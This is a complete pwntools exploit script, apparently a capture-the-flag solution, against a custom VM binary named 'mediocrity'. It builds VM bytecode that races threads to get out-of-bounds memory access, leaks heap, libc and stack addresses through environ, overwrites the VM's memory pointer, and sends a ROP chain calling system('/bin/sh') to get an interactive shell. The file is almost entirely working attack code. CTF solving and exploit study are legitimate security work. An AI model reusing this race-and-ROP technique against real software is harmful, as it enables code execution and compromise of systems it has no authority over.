#!/usr/bin/env python3
from pwn import *
context.terminal = "tmux split -h".split()
# context.log_level = "debug"
p = process("./mediocrity", env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF("./libc.so.6", checksec=False)

def assembler(code):
    codes = code.strip().split("\n")
    
    parsed = []
    parsed2 = []
    parsed3 = []
    labels = {}
    
    for inst in codes:
        inst = inst.strip()
        comment = inst.find("//")
        if comment != -1:
            inst = inst[:comment]
        
        comment = inst.find("#")
        if comment != -1:
            inst = inst[:comment]
        
        if inst:
            parsed.append(inst)
    
    pc = 0
    for inst in parsed:
        if ":" in inst:
            label = inst[:inst.find(":")]
            assert label not in labels
            labels[label] = pc
        else:
            parsed2.append(inst)
            pc += 1
    
    for i, inst in enumerate(parsed2):    
        for label, pc in labels.items():
            inst = inst.replace(label, str(pc))
        # print (i, inst)
        parsed3.append(eval(inst))
    
    return b''.join(parsed3)

dummy = 0xdeadbeef
def x(t1, t2=dummy, v1=dummy, v2=dummy):
    return b''.join([
        p16(t1), p16(t2), p64(v1), p64(v2)
    ])

def movRC(reg, value): return x(9, 1, reg, value)
def movMR(addr, reg): return x(9, 3, addr, reg)
def xorRC(reg, value): return x(6, 1, reg, value)
def jmp(pc): return x(11, 2, pc)
def jnz(pc): return x(13, 2, pc)
def thread(pc): return x(14, 2, pc)

def raceRead(): return '\n'.join([
    "movRC(0, 0)", 
    "x(15, 3)"
])

def raceWrite(): return '\n'.join([
    "movRC(0, 1)", 
    "x(15, 3)"
])

def Read(): return '\n'.join([
    "movRC(0, 0)", 
    "x(15, 2)"
])

def Write(): return '\n'.join([
    "movRC(0, 1)", 
    "x(15, 2)"
])

def WriteMem(addr, value): return '\n'.join([
    f"movRC(7, {value})",
    f"movMR({addr}, 7)",
])

leak = f"""
{WriteMem(0x100, 0)}
{WriteMem(0x110, 1)}

thread(TEST)
thread(RACER1)
thread(RACER2)
jmp(MAIN)

MAIN:
movRC(2, 0x100)
movRC(3, 0x108)
movRC(1, 0x110)
{raceWrite()}
xorRC(0, 0x1000)
jnz(MAIN)
xorRC(100, 0) // error

TEST:
movRC(1, 0x110)
jmp(TEST)

RACER1:
{WriteMem(0x108, 0x1000)}
jmp(RACER1)

RACER2:
{WriteMem(0x108, 0)}
jmp(RACER2)
"""

leak_asm = assembler(leak)
p.sendlineafter(b">>", b"1")
p.sendlineafter(b": ", str(len(leak_asm)).encode())

gdb.attach(p)
p.send(leak_asm)
sleep(0.1)

dump = p.recvuntil("complete", drop=True)
# print(hexdump(dump))

leak = u64(dump[0xda0:0xda8])
heap_base = u64(dump[0x610:0x618]) - 0x12bc0
# libc_base = leak + 0xeb9e0 # without LD_PRELOAD
libc_base = leak + 0x346a50
print("leak", hex(leak))
print("heap_base", hex(heap_base))
print("libc", hex(libc_base))
environ = libc_base + libc.symbols['environ']
print("environ", hex(environ))

ex1 = f"""
{WriteMem(0x100, 0)}
{WriteMem(0x110, 8)}

thread(TEST)
thread(RACER1)
thread(RACER2)
jmp(MAIN)

MAIN:
movRC(1, 0x100)
movRC(2, 0x108)
movRC(3, 0x110)
{raceRead()}
xorRC(0, 8)
jnz(MAIN)

// read 8B done (wherever)
movRC(1, 1)
movRC(2, 0)
movRC(3, 8)
{Write()}

movRC(1, 0)
movRC(2, 8)
movRC(3, 8)
{Read()}
xorRC(0, 2) // yes!~
jnz(MAIN)

xorRC(100, 0) // error

TEST:
movRC(1, 0x110)
jmp(TEST)

RACER1:
{WriteMem(0x108, (-0x68 & 0xffffffffffffffff))} // overwrite vm->mem600
jmp(RACER1)

RACER2:
{WriteMem(0x108, 0)}
jmp(RACER2)
"""

ex1_asm = assembler(ex1)
p.sendlineafter(b">>", b"1")
p.sendlineafter(b": ", str(len(ex1_asm)).encode())
sleep(0.1)

p.send(ex1_asm)
sleep(0.1)

while True:
    p.send(p64(environ))
    data = p.recvn(8)
    print (hexdump(data))
    
    if data == p64(environ):
        p.sendline("") # fail
        continue
    else:
        p.sendline("y") # success
        break

stack_leak = u64(data)
print("stack_leak", hex(stack_leak))


ex2 = f"""
{WriteMem(0x100, 0)}
{WriteMem(0x110, 8)} // space for rop payload

thread(TEST)
thread(RACER1)
thread(RACER2)
jmp(MAIN)

MAIN:
movRC(1, 0x100)
movRC(2, 0x108)
movRC(3, 0x110)
{raceRead()}
xorRC(0, 8)  # race condition fail? -> retry
jnz(MAIN)

// read 8B done (wherever)
movRC(1, 1)
movRC(2, 0)
movRC(3, 8)
{Write()}

movRC(1, 0)
movRC(2, 8)
movRC(3, 8)
{Read()}
xorRC(0, 2) // yes!~
jnz(MAIN)

movRC(1, 0)
movRC(2, 0)
movRC(3, 0x80)
{Read()} # ROP!

TEST:
movRC(1, 0x110)
jmp(TEST)

RACER1:
{WriteMem(0x108, (-0x68 & 0xffffffffffffffff))} // overwrite vm->mem600
jmp(RACER1)

RACER2:
{WriteMem(0x108, 0)}
jmp(RACER2)
"""

# gdb.attach(p, """
# set follow-fork-mode child
# # set scheduler-locking on
# bb 0x000000000003E35
# """)
ex2_asm = assembler(ex2)
p.sendlineafter(b">>", b"1")
p.sendlineafter(b": ", str(len(ex2_asm)).encode())
sleep(0.1)

p.send(ex2_asm)

addr_ret = stack_leak - 0x200
print("rop", hex(addr_ret))
while True:
    p.send(p64(addr_ret))
    data = p.recvn(8)
    print (hexdump(data))
    
    if data == p64(addr_ret):
        p.sendline("") # fail
        continue
    else:
        p.sendline("y") # success
        break

rdi_ret = libc_base + 0x2a3e5
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
system = libc_base + libc.symbols['system']

p.sendline(b''.join([
    p64(rdi_ret + 1),
    p64(rdi_ret),
    p64(binsh),
    p64(system),
]))

sleep(0.1)
p.sendline("id")
p.interactive()
